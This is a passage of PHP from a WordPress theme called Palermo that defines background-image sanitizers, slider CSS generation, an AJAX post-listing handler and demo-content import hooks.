		return apply_filters( 'palermo_sanitize_image_position_x_default', 'center' );
	}
endif;

if ( ! function_exists( 'palermo_get_image_position_y_choices' ) ) :
	function palermo_get_image_position_y_choices() {
		return apply_filters( 'palermo_image_position_y_choices', array(
			'top'    => esc_html__( 'Top', 'palermo' ),
			'center' => esc_html__( 'Center', 'palermo' ),
			'bottom' => esc_html__( 'Bottom', 'palermo' ),
		) );
	}
endif;

if ( ! function_exists( 'palermo_sanitize_image_position_y' ) ) :
	function palermo_sanitize_image_position_y( $value ) {
		$choices = palermo_get_image_position_y_choices();
		if ( array_key_exists( $value, $choices ) ) {
			return $value;
		}

		return apply_filters( 'palermo_sanitize_image_position_y_default', 'center' );
	}
endif;

if ( ! function_exists( 'palermo_get_image_attachment_choices' ) ) :
	function palermo_get_image_attachment_choices() {
		return apply_filters( 'palermo_image_attachment_choices', array(
			'scroll' => esc_html__( 'Scroll', 'palermo' ),
			'fixed'  => esc_html__( 'Fixed', 'palermo' ),
		) );
	}
endif;

if ( ! function_exists( 'palermo_sanitize_image_attachment' ) ) :
	function palermo_sanitize_image_attachment( $value ) {
		$choices = palermo_get_image_attachment_choices();
		if ( array_key_exists( $value, $choices ) ) {
			return $value;
		}

		return apply_filters( 'palermo_sanitize_image_attachment_default', 'scroll' );
	}
endif;

if ( ! function_exists( 'palermo_get_background_styles' ) ) :
	function palermo_get_background_styles( $prefix, $selector ) {
		$bg_color         = get_theme_mod( $prefix . '_bg_color' );
		$image            = get_theme_mod( $prefix . '_image' );
		$image_repeat     = get_theme_mod( $prefix . '_image_repeat', 'no-repeat' );
		$image_position_x = get_theme_mod( $prefix . '_image_position_x', 'center' );
		$image_position_y = get_theme_mod( $prefix . '_image_position_y', 'center' );
		$image_attachment = get_theme_mod( $prefix . '_image_attachment', 'scroll' );
		$image_cover      = get_theme_mod( $prefix . '_image_cover', 1 );

		$style = '';

		if ( $bg_color || $image ) {
			$style .= $selector . ' { ';

			if ( $bg_color ) {
				$style .= sprintf( 'background-color: %s; ',
					$bg_color
				);
			}

			if ( $image ) {
				$style .= sprintf( 'background-image: url(%s); ',
					$image
				);

				if ( $image_repeat ) {
					$style .= sprintf( 'background-repeat: %s; ',
						$image_repeat
					);
				}

				if ( $image_position_x && $image_position_y ) {
					$style .= sprintf( 'background-position: %s %s; ',
						$image_position_x,
						$image_position_y
					);
				}

				if ( $image_attachment ) {
					$style .= sprintf( 'background-attachment: %s; ',
						$image_attachment
					);
				}

				if ( $image_cover ) {
					$style .= 'background-size: cover; ';
				}
			}

			$style .= '}';
		}

		return $style;
	}
endif;

if ( ! function_exists( 'palermo_enqueue_background_slider_css' ) ) :
	function palermo_enqueue_background_slider_css( $slider ) {
		ob_start();
/*
		if ( ! empty( $slider['params']['height'] ) ) :
			?>
			#maxslider-<?php echo sanitize_html_class( $slider['id'] ); ?> {
				height: <?php echo intval( $slider['params']['height'] ); ?>px;
			}
			<?php
		endif;
*/
		if ( ! empty( $slider['params']['navigation_fg_color'] ) || ! empty( $slider['params']['navigation_bg_color'] ) ) :
			?>
			.slide-control {
				<?php if ( ! empty( $slider['params']['navigation_fg_color'] ) ) : ?>
					color: <?php echo $slider['params']['navigation_fg_color']; ?>;
				<?php endif; ?>

				<?php if ( ! empty( $slider['params']['navigation_bg_color'] ) ) : ?>
					background-color: <?php echo $slider['params']['navigation_bg_color']; ?>;
				<?php endif; ?>
			}
			<?php
		endif;

		foreach ( $slider['slides'] as $slide ) {
			$slide_class = "maxslider-{$slider['id']}-slide-{$slide['id']}";

			$image_url = MaxSlider::get_image_src( intval( $slide['image_id'] ), $slider['params']['image_size'] );

			if ( ! empty( $image_url ) ) {
				?>
				.<?php echo sanitize_html_class( $slide_class ); ?> {
					background-image: url(<?php echo esc_url_raw( $image_url ); ?>);
				}
				<?php
			}

			if ( ! empty( $slide['content_bg_color'] ) ) {
				?>
				.<?php echo sanitize_html_class( $slide_class ); ?> .maxslider-slide-content-pad {
					padding: 25px;
					background-color: <?php echo $slide['content_bg_color']; ?>;
				}
				<?php
			}

			if ( ! empty( $slide['title'] ) ) {
				$style = '';
				if ( ! empty( $slide['title_size'] ) ) {
					$style .= sprintf( 'font-size: %spx; ', $slide['title_size'] );
				}
				if ( ! empty( $slide['title_color'] ) ) {
					$style .= sprintf( 'color: %s; ', $slide['title_color'] );
				}
				?>
				.<?php echo sanitize_html_class( $slide_class ); ?> .ci-slide-title {
					<?php echo $style; ?>
				}
				<?php
			}

			if ( ! empty( $slide['subtitle'] ) ) {
				$style = '';
				if ( ! empty( $slide['subtitle_size'] ) ) {
					$style .= sprintf( 'font-size: %spx; ', $slide['subtitle_size'] );
				}
				if ( ! empty( $slide['subtitle_color'] ) ) {
					$style .= sprintf( 'color: %s; ', $slide['subtitle_color'] );
				}
				?>
				.<?php echo sanitize_html_class( $slide_class ); ?> .ci-slide-subtitle {
					<?php echo $style; ?>
				}
				<?php
			}

			if ( ! empty( $slide['button'] ) && ! empty( $slide['button_url'] ) ) {
				$style = '';
				if ( ! empty( $slide['button_fg_color'] ) ) {
					$style .= sprintf( 'color: %s; ', $slide['button_fg_color'] );
				}
				if ( ! empty( $slide['button_bg_color'] ) ) {
					$style .= sprintf( 'background-color: %s; ', $slide['button_bg_color'] );
				}
				?>
				.<?php echo sanitize_html_class( $slide_class ); ?> .btn,
				.<?php echo sanitize_html_class( $slide_class ); ?> .btn:hover,
				.<?php echo sanitize_html_class( $slide_class ); ?> .btn:focus {
					<?php echo $style; ?>
				}
				<?php
			}

		}

		$css = ob_get_clean();
		$css = apply_filters( 'maxslider_enqueue_slider_css', $css, $slider );

		wp_enqueue_style( 'maxslider-footer' );
		wp_add_inline_style( 'maxslider-footer', $css );
	}
endif;

/**
 * Theme Elements
 */
if ( defined( 'ELEMENTOR_VERSION' ) && version_compare( PHP_VERSION, '5.4', '>=' ) ) {
	require_once( 'inc/elements.php' );
}

function palermo_post_types() {
	$post_types_available = get_post_types( array( 'public' => true ), 'objects' );
	unset( $post_types_available['attachment'] );
	if ( post_type_exists( 'elementor_library' ) ) {
		unset( $post_types_available['elementor_library'] );
	}

	$palermo_pt[] = '';

	foreach ( $post_types_available as $key => $pt ) {
		$palermo_pt[ $key ] = $pt->label;
	}

	return $palermo_pt;
}

add_action( 'wp_ajax_palermo_get_posts', 'ajax_palermo_posts' );
function ajax_palermo_posts() {

	// Verify nonce
	if ( ! isset( $_POST['palermo_post_nonce'] ) || ! wp_verify_nonce( $_POST['palermo_post_nonce'], 'palermo_post_nonce' ) ) {
		die( 'Permission denied' );
	}

	$post_type = $_POST['post_type'];

	$q = new WP_Query( array(
		'post_type' => $post_type,
		'posts_per_page' => -1,
	) );
	?>

	<option><?php esc_html_e( 'Select an item', 'palermo' ); ?></option>

	<?php while ( $q->have_posts() ) : $q->the_post(); ?>
		<option value="<?php echo esc_attr( get_the_ID() ); ?>"><?php the_title(); ?></option>
		<?php
	endwhile;
	wp_reset_postdata();
	wp_die();
}


if ( ! defined( 'PALERMO_WHITELABEL' ) || false === (bool) PALERMO_WHITELABEL ) {
	add_filter( 'pt-ocdi/import_files', 'palermo_ocdi_import_files' );
	add_action( 'pt-ocdi/after_import', 'palermo_ocdi_after_import_setup' );
}

function palermo_ocdi_import_files( $files ) {
	if ( ! defined( 'PALERMO_NAME' ) ) {
		define( 'PALERMO_NAME', 'palermo' );
	}

	$demo_dir_url = untrailingslashit( apply_filters( 'palermo_ocdi_demo_dir_url', 'https://www.cssigniter.com/sample_content/' . PALERMO_NAME ) );

	// When having more that one predefined imports, set a preview image, preview URL, and categories for isotope-style filtering.
	$new_files = array(
		array(
			'import_file_name'           => esc_html__( 'Demo Import', 'palermo' ),
			'import_file_url'            => $demo_dir_url . '/content.xml',
			'import_widget_file_url'     => $demo_dir_url . '/widgets.wie',
			'import_customizer_file_url' => $demo_dir_url . '/customizer.dat',
		),
	);

	return array_merge( $files, $new_files );
}

function palermo_ocdi_after_import_setup() {
	// Set up nav menus.
	$main_menu = get_term_by( 'name', 'Menu', 'nav_menu' );

	set_theme_mod( 'nav_menu_locations', array(
		'main_menu' => $main_menu->term_id,
	) );

	// Set up home and blog pages.
	$front_page_id = get_page_by_title( 'Home' );
	$blog_page_id  = get_page_by_title( 'Our Blog' );

	update_option( 'show_on_front', 'page' );
	update_option( 'page_on_front', $front_page_id->ID );
	update_option( 'page_for_posts', $blog_page_id->ID );
}

